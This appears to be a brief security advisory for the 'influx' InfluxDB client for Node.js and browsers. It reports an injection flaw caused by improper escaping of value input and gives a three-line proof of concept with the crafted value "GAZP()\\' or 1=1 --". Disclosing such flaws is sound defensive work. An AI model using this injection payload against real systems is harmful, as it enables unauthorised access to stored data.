## description ##

 influx is an InfluxDB Client for Node.js and Browsers.

 Affected versions of this package are vulnerable to SQL Injection due to improperly escaping value input.

 ## POC ##

 ```
 const influx = require('influx')
 const exp = new influx.Expression();
 exp.tag('symbol').equals.value("GAZP()\\' or 1=1 --").toString()
 ```